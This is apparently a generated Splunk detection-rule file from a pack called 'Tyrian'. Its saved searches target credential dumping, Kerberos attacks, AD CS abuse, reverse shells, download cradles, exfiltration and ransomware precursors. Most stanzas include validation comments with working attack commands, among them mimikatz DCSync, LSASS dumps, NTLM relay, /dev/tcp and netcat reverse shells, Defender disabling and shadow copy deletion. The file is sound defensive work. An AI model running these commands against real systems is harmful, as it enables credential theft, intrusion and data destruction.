# Tyrian Detection Pack - Splunk searches (GENERATED, do not edit by hand).
# Source of truth: rules/**.yml
# Regenerate: python tools/sigma_compile.py --backend splunk
#
# Each stanza is a saved search. Adjust the index= prefix to your environment.

[Tyrian - File Transfer via BITS]
description = Detects bitsadmin or the PowerShell BITS cmdlets being used to move a file. The Background Intelligent Transfer Service is a signed Windows component that downloads on behalf of a caller, so the traffic comes from a trusted process, the job survives reboots, and the transfer continues after the calling process exits. That combination is why it is a durable download and persistence primitive.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\bitsadmin.exe") AND (CommandLine="*/transfer*" OR CommandLine="*/addfile*" OR CommandLine="*/setnotifycmdline*")) OR ((CommandLine="*Start-BitsTransfer*" AND CommandLine="*-Source*")))
# severity: medium   techniques: T1197,T1105   status: experimental
# validate: Atomic Red Team T1197
#   bitsadmin /transfer tyriantest /download /priority high http://127.0.0.1/a.txt C:\Windows\Temp\a.txt
#   Start-BitsTransfer -Source http://127.0.0.1/a.txt -Destination C:\Windows\Temp\a.txt
# source: rules/command-and-control/bitsadmin-transfer-job.yml

[Tyrian - Cobalt Strike Default Named Pipe]
description = Detects named pipes matching Cobalt Strike's default naming for SMB beacons and post-exploitation jobs (msagent_, postex_, status_, and the MSSE- pattern). Operators can and do change these in a malleable profile, so this catches unmodified tooling rather than a tuned engagement. It stays worth having because unmodified tooling is what commodity intrusions actually run.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((EventID="17" OR EventID="18") AND (PipeName="\msagent_*" OR PipeName="\postex_*" OR PipeName="\postex_ssh_*" OR PipeName="\status_*" OR PipeName="\MSSE-*" OR PipeName="\mojo_*" OR PipeName="\netsvc_*"))
# severity: high   techniques: T1055,T1071   status: experimental
# validate: Atomic Red Team T1055
#   Run a Cobalt Strike beacon with a default malleable profile and start an SMB
#   beacon or a post-exploitation job (for example `run whoami`), which creates a
#   postex_ pipe. On a range, any process creating a pipe named \msagent_test
#   reproduces the telemetry.
# source: rules/command-and-control/cobalt-strike-named-pipe.yml

[Tyrian - Possible DNS Tunneling via Abnormally Long Queries]
description = Detects repeated DNS queries with unusually long labels against a single parent domain, the signature of data smuggled inside DNS. Expect tuning: CDNs and endpoint security products legitimately emit long names.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((EventID="22") AND (match(QueryName, "^[A-Za-z0-9+/=_-]{40,}\\."))) | bucket _time span=5m | stats count as hits by _time,host | where hits >= 10
# severity: medium   techniques: T1071.004   status: experimental
# validate: Atomic Red Team T1071.004
#   for i in $(seq 1 30); do nslookup $(head -c 40 /dev/urandom | base64 | tr -d '=+/').tunnel.example.com; done
# source: rules/command-and-control/dns-tunneling-long-query.yml

[Tyrian - ADCS Certificate Requested With an Arbitrary Subject Alternative Name]
description = Detects a certificate request that carries a caller-supplied Subject Alternative Name (ESC1). If a template allows the enrollee to specify the SAN and permits client authentication, any user who can enroll can request a certificate that says they are the domain administrator, then authenticate with it. The certificate stays valid until it expires, which is why this beats a password reset as a persistence route.
search = index=* source="WinEventLog:Security" (((EventID="4886" OR EventID="4887")) AND ((Attributes="*SAN:*" OR Attributes="*subjectaltname*" OR Attributes="*upn=*")))
# severity: critical   techniques: T1649   status: experimental
# validate: Atomic Red Team T1649
#   certipy req -u user@domain -p pass -target ca.domain -template VulnTemplate -upn administrator@domain
#   Certify.exe request /ca:ca.domain\CA-NAME /template:VulnTemplate /altname:administrator
# source: rules/credential-access/adcs-esc1-san-certificate-request.yml

[Tyrian - ADCS Certificate Issued to a Machine Account on a User Template]
description = Detects a certificate request whose requester is a computer account. Coercing a domain controller to authenticate to the AD CS web enrollment endpoint over NTLM and relaying it (ESC8) produces exactly this: the CA sees the DC's machine account enrolling, usually against a user or DC template. Machine accounts do enroll legitimately, so pair this with the template name before escalating.
search = index=* source="WinEventLog:Security" (((EventID="4886" OR EventID="4887") AND (Requester="*$")) AND ((Attributes="*CertificateTemplate:User*" OR Attributes="*CertificateTemplate:DomainController*" OR Attributes="*CertificateTemplate:KerberosAuthentication*")))
# severity: high   techniques: T1649,T1557.001   status: experimental
# validate: Atomic Red Team T1649
#   PetitPotam.py -u user -p pass <attacker-ip> <dc-ip>
#   ntlmrelayx.py -t http://ca.domain/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# source: rules/credential-access/adcs-machine-account-user-certificate.yml

[Tyrian - AS-REP Roasting via Accounts Without Kerberos Pre-Authentication]
description = Detects Kerberos AS-REQ activity for accounts that have pre-authentication disabled. The KDC hands back an AS-REP encrypted with a key derived from the account password, which is then cracked offline. Deliberate use of DONT_REQ_PREAUTH is rare, so volume here is usually roasting.
search = index=* source="WinEventLog:Security" (((EventID="4768") AND (TicketOptions="0x40810010") AND (TicketEncryptionType="0x17" OR TicketEncryptionType="0x18")) AND NOT ((TargetUserName="*$")))
# severity: high   techniques: T1558.004   status: stable
# validate: Atomic Red Team T1558.004
#   Rubeus.exe asreproast /format:hashcat
#   GetNPUsers.py -dc-ip <dc> <domain>/ -usersfile users.txt
# source: rules/credential-access/asrep-roasting-no-preauth.yml

[Tyrian - DCSync Directory Replication From a Non-Domain-Controller]
description = Detects use of the directory replication extended rights, which let a caller ask a DC for password hashes without ever touching NTDS.dit. Only domain controllers should legitimately replicate, so this keys on caller identity.
search = index=* source="WinEventLog:Security" (((EventID="4662") AND (Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*89e95b76-444d-4c62-991a-0facbeda640c*")) AND NOT ((SubjectUserName="*$")))
# severity: critical   techniques: T1003.006   status: stable
# validate: Atomic Red Team T1003.006
#   mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
#   secretsdump.py -just-dc <domain>/<user>@<dc>
# source: rules/credential-access/dcsync-replication-rights.yml

[Tyrian - Kerberoasting via RC4 Service Ticket Request]
description = Detects Kerberoasting by flagging RC4-encrypted (etype 0x17) TGS requests for user-account SPNs. Roasting tools force RC4 because it cracks far faster than AES.
search = index=* source="WinEventLog:Security" ((((EventID="4769") AND (TicketEncryptionType="0x17") AND (TicketOptions="0x40810000")) AND NOT ((ServiceName="*$"))) AND NOT ((ServiceName="krbtgt")))
# severity: high   techniques: T1558.003   status: stable
# validate: Atomic Red Team T1558.003
#   Rubeus.exe kerberoast /rc4opsec
#   GetUserSPNs.py -request <domain>/<user>
# source: rules/credential-access/kerberoasting-rc4-tgs.yml

[Tyrian - krbtgt Account Password Reset or Modified]
description = Detects a password reset or attribute change on the krbtgt account. Its hash signs every Kerberos ticket in the domain, so it is both the key an attacker needs for a Golden Ticket and the key a defender rotates (twice) to invalidate one. Either way, an unexpected change here is one of the highest-signal events Active Directory produces.
search = index=* source="WinEventLog:Security" ((EventID="4723" OR EventID="4724" OR EventID="4738") AND (TargetUserName="krbtgt*"))
# severity: critical   techniques: T1558.001   status: experimental
# validate: Atomic Red Team T1558.001
#   Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)
# source: rules/credential-access/krbtgt-account-modified.yml

[Tyrian - Linux Password Hash File Accessed by a User]
description = Detects reads or writes of /etc/shadow and /etc/gshadow by an interactive login. The audit rule that feeds this is already filtered to auid>=1000, so normal authentication by daemons (which run with auid unset) does not reach it. A hit is someone at a keyboard reading the hashes.
search = index=* sourcetype="auditd" ((key="tyrian_shadow"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1003.008   status: experimental
# validate: Atomic Red Team T1003.008
#   sudo cat /etc/shadow > /dev/null
#   sudo unshadow /etc/passwd /etc/shadow > /tmp/creds.txt
# source: rules/credential-access/linux-shadow-file-access.yml

[Tyrian - LSASS Dump via comsvcs.dll MiniDump]
description = Detects the living-off-the-land LSASS dump that calls MiniDump inside comsvcs.dll through rundll32, avoiding procdump and mimikatz binaries entirely. The ordinal form is the usual giveaway.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\rundll32.exe") AND (CommandLine="*comsvcs*")) AND ((CommandLine="*MiniDump*" OR CommandLine="*#24*")))
# severity: critical   techniques: T1003.001   status: stable
# validate: Atomic Red Team T1003.001
#   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\l.dmp full
# source: rules/credential-access/lsass-dump-comsvcs.yml

[Tyrian - LSASS Memory Access with Read Rights]
description = Detects credential dumping by flagging process handle access to lsass.exe with read rights (Sysmon Event ID 10), excluding known security products. Tool-agnostic: catches Mimikatz, procdump, comsvcs, and custom loaders alike.
search = index=*  (((TargetImage="*\lsass.exe") AND (GrantedAccess="0x1010" OR GrantedAccess="0x1410" OR GrantedAccess="0x143a" OR GrantedAccess="0x1438")) AND NOT ((SourceImage="*\MsMpEng.exe" OR SourceImage="*\wmiprvse.exe")))
# severity: high   techniques: T1003.001   status: stable
# validate: Atomic Red Team T1003.001
#   procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp
# source: rules/credential-access/lsass-handle-access.yml

[Tyrian - NTDS.dit Extraction via ntdsutil or Shadow Copy]
description = Detects the two common ways the Active Directory database leaves a domain controller: an ntdsutil IFM media creation, or a copy of NTDS.dit out of a volume shadow copy. Either yields every domain hash for offline cracking.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\ntdsutil.exe") AND (CommandLine="*create*" AND CommandLine="*ifm*")) OR ((CommandLine="*ntds.dit*")))
# severity: critical   techniques: T1003.003   status: stable
# validate: Atomic Red Team T1003.003
#   ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q
# source: rules/credential-access/ntds-dit-extraction.yml

[Tyrian - Password Spraying, Many Accounts from One Source]
description = Detects password spraying: a burst of bad-password failures (Event ID 4625, SubStatus 0xC000006A) across many distinct accounts from one source in a short window. Spraying is defined by breadth, not depth. Requires an aggregation-capable backend; the condition expresses the intent (count distinct targets per source).
search = index=* source="WinEventLog:Security" ((EventID="4625") AND (SubStatus="0xc000006a")) | bucket _time span=5m | stats dc(TargetUserName) as hits by _time,IpAddress | where hits > 10
# severity: high   techniques: T1110.003   status: stable
# validate: Atomic Red Team T1110.003
#   Spray one password across 20+ accounts from a single host, e.g.
#   kerbrute passwordspray -d <domain> users.txt 'Autumn2026!'
# source: rules/credential-access/password-spraying-4625.yml

[Tyrian - SAM and SYSTEM Registry Hive Dump]
description = Detects reg.exe saving the SAM, SYSTEM or SECURITY hives to disk. Together those give local account hashes plus the boot key needed to decrypt them, and it is a standard first move after landing on a host.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\reg.exe") AND (CommandLine="*save*")) AND ((CommandLine="*hklm\\sam*" OR CommandLine="*hklm\\system*" OR CommandLine="*hklm\\security*")))
# severity: critical   techniques: T1003.002   status: stable
# validate: Atomic Red Team T1003.002
#   reg save HKLM\SAM C:\Windows\Temp\sam.hiv
#   reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
# source: rules/credential-access/sam-hive-dump.yml

[Tyrian - Shadow Credentials Added via msDS-KeyCredentialLink]
description = Detects a write to the msDS-KeyCredentialLink attribute of a user or computer object. Adding a key credential registers an attacker-controlled certificate for Kerberos PKINIT, giving them a way to authenticate as that principal and recover its NTLM hash without ever changing a password. Almost nothing writes this attribute outside Windows Hello for Business enrollment.
search = index=* source="WinEventLog:Security" ((EventID="5136") AND (AttributeLDAPDisplayName="msDS-KeyCredentialLink"))
# severity: critical   techniques: T1556,T1098   status: experimental
# validate: Atomic Red Team T1556
#   Whisker.exe add /target:DC01$
#   pywhisker.py -d domain -u user -p pass --target victim --action add
# source: rules/credential-access/shadow-credentials-key-credential-link.yml

[Tyrian - WDigest UseLogonCredential Enabled (Cleartext Credential Staging)]
description = Detects the registry change that forces Windows to keep cleartext credentials in LSASS memory again. Attackers set this, wait for users to re-authenticate, then dump. The write itself is the early warning, well before the dump.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((TargetObject="*\\WDigest\\UseLogonCredential") AND (Details="DWORD (0x00000001)"))
# severity: critical   techniques: T1112   status: stable
# validate: Atomic Red Team T1112
#   reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
# source: rules/credential-access/wdigest-cleartext-enabled.yml

[Tyrian - DCShadow Rogue Domain Controller Registration]
description = Detects registration of a new nTDSDSA object or an SPN change that makes a host look like a domain controller. DCShadow registers a rogue DC just long enough to push a directory replication, which writes attacker-chosen attributes into AD without generating the directory-change events a normal write would. Catching the registration is the reliable way to see it, because the changes themselves are designed not to be logged.
search = index=* source="WinEventLog:Security" (((EventID="5137") AND (ObjectClass="nTDSDSA")) OR ((EventID="5136") AND (AttributeLDAPDisplayName="servicePrincipalName") AND (AttributeValue="*GC/*" OR AttributeValue="*E3514235-4B06-11D1-AB04-00C04FC2DCD2*")))
# severity: critical   techniques: T1207   status: experimental
# validate: Atomic Red Team T1207
#   mimikatz "lsadump::dcshadow /object:target /attribute:primaryGroupID /value:512"
#   mimikatz "lsadump::dcshadow /push"
# source: rules/defense-evasion/dcshadow-rogue-domain-controller.yml

[Tyrian - Microsoft Defender Protection Disabled]
description = Detects real-time protection or scanning being turned off through PowerShell or the registry, which is a routine precursor to dropping tooling that would otherwise be quarantined.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((CommandLine="*Set-MpPreference -DisableRealtimeMonitoring $true*" OR CommandLine="*DisableRealtimeMonitoring 1*" OR CommandLine="*Add-MpPreference -ExclusionPath*" OR CommandLine="*DisableAntiSpyware*"))
# severity: critical   techniques: T1562.001   status: stable
# validate: Atomic Red Team T1562.001
#   Set-MpPreference -DisableRealtimeMonitoring $true
# source: rules/defense-evasion/defender-disabled.yml

[Tyrian - Security or System Event Log Cleared]
description = Detects clearing of the Windows event log. There is almost no benign reason to wipe the Security log on a production host, and it is the classic final step before an operator disengages.
search = index=* source="WinEventLog:Security" ((EventID="1102" OR EventID="104"))
# severity: critical   techniques: T1070.001   status: stable
# validate: Atomic Red Team T1070.001
#   wevtutil cl Security
# source: rules/defense-evasion/event-log-cleared.yml

[Tyrian - Linux Audit Subsystem Tampered With]
description = Detects execution of auditctl or auditd and changes to /etc/audit. Disabling the audit daemon is the natural first move for an attacker who realises they are being recorded, and it blinds every other Linux rule in this pack. Treat a stop or ruleset flush that you cannot tie to a change ticket as an incident.
search = index=* sourcetype="auditd" (((key="tyrian_auditcfg")) OR ((key="tyrian_exec") AND (exe="*/systemctl" OR exe="*/service") AND (a2="*audit*")))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: critical   techniques: T1562.001   status: experimental
# validate: Atomic Red Team T1562.001
#   auditctl -e 0
#   systemctl stop auditd
# source: rules/defense-evasion/linux-auditd-tampering.yml

[Tyrian - Linux Execution From a World-Writable Directory]
description = Detects binaries executed out of /tmp, /var/tmp or /dev/shm. Packages install to /usr and /opt, so sustained execution from a scratch directory is either a careless admin or a payload that landed where any user can write. /dev/shm is the strongest of the three: it is memory-backed and leaves no disk artefact.
search = index=* sourcetype="auditd" ((key="tyrian_exec") AND (exe="/tmp/*" OR exe="/var/tmp/*" OR exe="/dev/shm/*"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1036.005   status: experimental
# validate: Atomic Red Team T1036.005
#   cp /bin/echo /dev/shm/updater && /dev/shm/updater staged
# source: rules/defense-evasion/linux-execution-from-world-writable.yml

[Tyrian - Linux Log Files Deleted From /var/log]
description = Detects unlink or rename of files under /var/log by an interactive user. The feeding audit rule watches deletion syscalls specifically rather than writes, because a write watch on /var/log fires on every log line and is unusable. An attacker clearing tracks removes or truncates; both show up here.
search = index=* sourcetype="auditd" ((key="tyrian_logdel"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1070.002   status: experimental
# validate: Atomic Red Team T1070.002
#   rm -f /var/log/tyrian-test.log
#   mv /var/log/auth.log /var/log/auth.log.bak
# source: rules/defense-evasion/linux-log-deletion.yml

[Tyrian - AMSI Bypass Attempt in PowerShell]
description = Detects the well-known reflection patterns used to neuter the Antimalware Scan Interface before running a payload. Matches script block content, so script block logging must be enabled.
search = index=* source="WinEventLog:Microsoft-Windows-PowerShell/Operational" ((ScriptBlockText="*amsiInitFailed*" OR ScriptBlockText="*AmsiUtils*" OR ScriptBlockText="*AmsiScanBuffer*" OR ScriptBlockText="*System.Management.Automation.AmsiUtils*"))
# severity: critical   techniques: T1562.001   status: stable
# validate: Atomic Red Team T1562.001
#   Run the classic amsiInitFailed reflection one-liner in a PowerShell session with
#   script block logging (EID 4104) enabled.
# source: rules/defense-evasion/powershell-amsi-bypass.yml

[Tyrian - Process Image Tampering (Hollowing or Herpaderping)]
description = Detects Sysmon's ProcessTampering event, raised when a process image on disk no longer matches what is mapped in memory. That mismatch is the defining artefact of process hollowing, herpaderping and doppelganging, where a legitimate binary is started suspended and its image replaced before execution resumes. Very few legitimate programs produce it.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((EventID="25"))
# severity: high   techniques: T1055.012   status: experimental
# validate: Atomic Red Team T1055.012
#   Run any hollowing proof of concept that starts a suspended process
#   (for example svchost.exe), unmaps its section and writes a replacement image.
#   Requires Sysmon 13 or later for event ID 25.
# source: rules/defense-evasion/process-image-tampering-hollowing.yml

[Tyrian - Remote Thread Created in Another Process]
description = Detects a thread created in a process the caller does not own, with the start address resolving into a module associated with injection or into no module at all. Injecting into a signed, expected process is how an implant inherits its network reputation and survives its own dropper exiting.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((((EventID="8")) AND ((TargetImage="*\lsass.exe" OR TargetImage="*\explorer.exe" OR TargetImage="*\svchost.exe" OR TargetImage="*\winlogon.exe" OR TargetImage="*\notepad.exe" OR TargetImage="*\rundll32.exe"))) AND NOT ((SourceImage="*\csrss.exe" OR SourceImage="*\wininit.exe" OR SourceImage="*\services.exe" OR SourceImage="*\MsMpEng.exe")))
# severity: high   techniques: T1055,T1055.003   status: experimental
# validate: Atomic Red Team T1055
#   Invoke-Mimikatz style injection, or any tool calling OpenProcess +
#   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread against notepad.exe.
#   Atomic Red Team T1055 includes a minimal C# injector for this.
# source: rules/defense-evasion/process-injection-createremotethread.yml

[Tyrian - rundll32 Loading a Payload From a Suspicious Location]
description = Detects rundll32 executing a DLL from a user-writable directory, running JavaScript through its scriptlet handler, or launching with no arguments at all. rundll32 is signed by Microsoft and present everywhere, so an implant that lives inside it inherits a trusted image name. A no-argument rundll32 is a particularly reliable tell, since it does nothing useful and is a common injection host.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\rundll32.exe") AND (CommandLine="*\Users\Public\*" OR CommandLine="*\AppData\Local\Temp\*" OR CommandLine="*\Windows\Temp\*" OR CommandLine="*\ProgramData\*" OR CommandLine="*C:\Users\*")) OR ((Image="*\rundll32.exe") AND (CommandLine="*javascript:*" OR CommandLine="*vbscript:*" OR CommandLine="*mshtml,RunHTMLApplication*" OR CommandLine="*url.dll,OpenURL*" OR CommandLine="*shell32.dll,ShellExec_RunDLL*")))
# severity: high   techniques: T1218.011   status: experimental
# validate: Atomic Red Team T1218.011
#   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('tyrian')
#   rundll32.exe C:\Windows\Temp\payload.dll,EntryPoint
# source: rules/defense-evasion/rundll32-suspicious-invocation.yml

[Tyrian - Active Directory Collection Consistent With SharpHound]
description = Detects the command-line shapes produced by SharpHound and equivalent collectors. Mass AD enumeration is the reconnaissance step that precedes nearly every modern domain compromise.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((CommandLine="*sharphound*" OR CommandLine="*-c all*" OR CommandLine="*--collectionmethod*" OR CommandLine="*Invoke-BloodHound*" OR CommandLine="*bloodhound.py*"))
# severity: high   techniques: T1087.002   status: stable
# validate: Atomic Red Team T1087.002
#   SharpHound.exe -c All --zipfilename loot
# source: rules/discovery/bloodhound-sharphound-collection.yml

[Tyrian - Domain Reconnaissance via Built-in Utilities]
description = Detects the burst of net, nltest and whoami calls typical of a freshly landed operator orienting inside a domain. Individually benign, so this is written as a threshold rule rather than a single-event alert.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((CommandLine="*net group "domain admins"*" OR CommandLine="*net localgroup administrators*" OR CommandLine="*nltest /domain_trusts*" OR CommandLine="*nltest /dclist*" OR CommandLine="*whoami /groups*" OR CommandLine="*net user /domain*")) | bucket _time span=10m | stats count as hits by _time,host | where hits >= 3
# severity: medium   techniques: T1482,T1087.002   status: experimental
# validate: Atomic Red Team T1087.002
#   net group "domain admins" /domain
#   net user /domain
#   nltest /dclist:<domain>
# source: rules/discovery/domain-recon-net-commands.yml

[Tyrian - Linux Host Enumeration Burst]
description = Detects a rapid sequence of situational-awareness commands from one host. No single one of these is suspicious, which is the point: the signal is the burst. A human landing on an unfamiliar box runs five of them in under a minute, while a legitimate user runs one, occasionally, with a reason.
search = index=* sourcetype="auditd" ((key="tyrian_exec") AND (exe="*/whoami" OR exe="*/id" OR exe="*/uname" OR exe="*/hostname" OR exe="*/lastlog" OR exe="*/last" OR exe="*/w" OR exe="*/netstat" OR exe="*/ss" OR exe="*/lsof" OR exe="*/crontab")) | bucket _time span=5m | stats count as hits by _time,host | where hits >= 5
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: medium   techniques: T1082,T1087.001   status: experimental
# validate: Atomic Red Team T1082
#   whoami; id; uname -a; hostname; last -n 5; ss -tulpn
# source: rules/discovery/linux-host-enumeration-burst.yml

[Tyrian - certutil Used as a Downloader]
description = Detects certutil fetching remote content or decoding base64 payloads. It is a signed Microsoft binary present everywhere, which makes it a favourite substitute for curl on locked-down hosts.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\certutil.exe")) AND ((CommandLine="*urlcache*" OR CommandLine="*verifyctl*" OR CommandLine="*decode*" OR CommandLine="*-f http*")))
# severity: high   techniques: T1105   status: stable
# validate: Atomic Red Team T1105
#   certutil.exe -urlcache -split -f http://<host>/payload.txt C:\Windows\Temp\p.txt
# source: rules/execution/certutil-download.yml

[Tyrian - Linux Remote Payload Piped Directly Into a Shell]
description = Detects the curl-pipe-bash install pattern, where a script is fetched over the network and executed without ever touching disk under a name anyone reviewed. Legitimate installers do this too, which is exactly why attackers can hide in it, so treat a hit as "what was the URL" rather than as a verdict.
search = index=* sourcetype="auditd" ((key="tyrian_exec") AND (match(a2, "(curl|wget)[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh")))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: medium   techniques: T1059.004,T1105   status: experimental
# validate: Atomic Red Team T1059.004
#   sh -c 'curl -s http://127.0.0.1/install.sh | bash'
#   sh -c 'wget -qO- http://127.0.0.1/install.sh | sh'
# source: rules/execution/linux-download-pipe-to-shell.yml

[Tyrian - Linux Reverse Shell Execution]
description = Detects the three reverse shells that show up in almost every Linux intrusion: bash writing to /dev/tcp, netcat with command execution, and a Python one-liner that spawns a pty over a socket. auditd records argv split across EXECVE a0..aN, so the payload lands in a2 when the shell is invoked as `sh -c '<payload>'`.
search = index=* sourcetype="auditd" ((((key="tyrian_exec") AND (a2="*/dev/tcp/*")) OR ((key="tyrian_exec") AND (exe="*/nc" OR exe="*/ncat" OR exe="*/netcat" OR exe="*/nc.openbsd" OR exe="*/nc.traditional") AND (a1="*-e*"))) OR ((key="tyrian_exec") AND (a2="*socket*" AND a2="*pty.spawn*")))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: critical   techniques: T1059.004   status: experimental
# validate: Atomic Red Team T1059.004
#   sh -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
#   nc -e /bin/sh 127.0.0.1 4444
#   python3 -c 'import socket,pty;s=socket.socket();s.connect(("127.0.0.1",4444));pty.spawn("/bin/bash")'
# source: rules/execution/linux-reverse-shell.yml

[Tyrian - mshta Executing a Remote or Script Payload]
description = Detects mshta.exe running content from a URL or an inline script handler. mshta is signed by Microsoft and frequently allowlisted, which is exactly why it is used to run HTA and JScript payloads.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\mshta.exe")) AND ((CommandLine="*http://*" OR CommandLine="*https://*" OR CommandLine="*javascript:*" OR CommandLine="*vbscript:*" OR CommandLine="*.hta*")))
# severity: high   techniques: T1218.005   status: stable
# validate: Atomic Red Team T1218.005
#   mshta.exe http://<host>/payload.hta
# source: rules/execution/mshta-remote-payload.yml

[Tyrian - PowerShell Download Cradle]
description = Detects the in-memory download-and-execute patterns used to stage a payload without writing it to disk, covering both the WebClient and Invoke-WebRequest forms alongside an execution primitive.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((((Image="*\\powershell.exe" OR Image="*\\pwsh.exe")) AND ((CommandLine="*DownloadString*" OR CommandLine="*DownloadFile*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*Net.WebClient*" OR CommandLine="*iwr *" OR CommandLine="*curl *"))) AND ((CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*iex(*" OR CommandLine="*| iex*")))
# severity: high   techniques: T1059.001   status: stable
# validate: Atomic Red Team T1059.001
#   powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<host>/a.ps1')"
# source: rules/execution/powershell-download-cradle.yml

[Tyrian - PowerShell Encoded Command Execution]
description = Detects PowerShell invoked with a base64 encoded command, which is how most loaders and post-exploitation frameworks hide their payload from casual command-line review.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\powershell.exe" OR Image="*\\pwsh.exe")) AND ((CommandLine="* -enc*" OR CommandLine="* -EncodedCommand*" OR CommandLine="* -e *" OR CommandLine="* -ec *")))
# severity: high   techniques: T1059.001   status: stable
# validate: Atomic Red Team T1059.001
#   powershell.exe -nop -w hidden -enc <base64-of-utf16le-command>
# source: rules/execution/powershell-encoded-command.yml

[Tyrian - regsvr32 Scriptlet Execution (Squiblydoo)]
description = Detects the Squiblydoo pattern where regsvr32 loads a remote scriptlet with /i and scrobj.dll, executing code through a signed binary and bypassing application allowlisting.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\regsvr32.exe")) AND ((CommandLine="*scrobj*" OR CommandLine="*/i:http*" OR CommandLine="*.sct*")))
# severity: critical   techniques: T1218.010   status: stable
# validate: Atomic Red Team T1218.010
#   regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
# source: rules/execution/regsvr32-scriptlet-squiblydoo.yml

[Tyrian - Bulk Archive Creation Consistent With Collection Staging]
description = Detects command-line archive tools compressing user or share directories, which is how data is staged before it leaves. Pair with an egress rule to turn this into a high-confidence exfiltration signal.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\\7z.exe" OR Image="*\\rar.exe" OR Image="*\\winrar.exe") AND (CommandLine="* a *" OR CommandLine="* -hp*")) AND ((CommandLine="*\\Users\\*" OR CommandLine="*\\Documents*" OR CommandLine="*\\Desktop*" OR CommandLine="*\\Shares*")))
# severity: medium   techniques: T1560.001   status: experimental
# validate: Atomic Red Team T1560.001
#   7z.exe a -hp'pass' C:\Windows\Temp\loot.7z C:\Users\<user>\Documents
# source: rules/exfiltration/archive-staging-for-exfil.yml

[Tyrian - Bulk Upload to Cloud Storage via Command-Line Tooling]
description = Detects rclone, megacmd and similar utilities being driven from the command line to copy data to cloud storage. Ransomware crews reach for rclone specifically because it is a legitimate, signed, cross-platform binary whose traffic is TLS to a mainstream provider, which defeats both signature matching and egress rules written around "unknown destinations". Pair with the archive-staging rule: stage then upload is the whole double-extortion pattern.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((Image="*\rclone.exe" OR Image="*\megacmd.exe" OR Image="*\MEGAclient.exe" OR Image="*\winscp.com" OR Image="*\winscp.exe") AND (CommandLine="*copy*" OR CommandLine="*sync*" OR CommandLine="*move*" OR CommandLine="*put*")) OR ((OriginalFileName="rclone.exe")))
# severity: high   techniques: T1567.002   status: experimental
# validate: Atomic Red Team T1567.002
#   rclone copy C:\Users\victim\Documents remote:exfil --transfers 8
# source: rules/exfiltration/exfiltration-to-cloud-storage.yml

[Tyrian - Backup and Recovery Destruction Before Encryption]
description = Detects deletion of backup catalogs and disabling of Windows recovery, which ransomware does immediately before encrypting so victims cannot roll back. This usually fires minutes ahead of the encryption itself.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((CommandLine="*wbadmin delete*")) OR ((CommandLine="*recoveryenabled no*" OR CommandLine="*bootstatuspolicy ignoreallfailures*")))
# severity: critical   techniques: T1490   status: stable
# validate: Atomic Red Team T1490
#   wbadmin delete catalog -quiet
#   bcdedit /set {default} recoveryenabled No
# source: rules/impact/backup-deletion-wbadmin-bcdedit.yml

[Tyrian - Shadow Copy Deletion via VSSAdmin or WMIC]
description = Detects the reliable ransomware precursor of deleting volume shadow copies to prevent rollback. Legitimate software almost never does this; ransomware almost always does, just before mass encryption (T1486 via T1490).
search = index=*  ((((Image="*\vssadmin.exe") AND (CommandLine="*delete*" AND CommandLine="*shadows*")) OR ((Image="*\wmic.exe") AND (CommandLine="*shadowcopy delete*"))) OR ((CommandLine="*Get-WmiObject*" AND CommandLine="*Win32_ShadowCopy*" AND CommandLine="*Delete*")))
# severity: high   techniques: T1486,T1490   status: stable
# validate: Atomic Red Team T1490
#   vssadmin.exe delete shadows /all /quiet
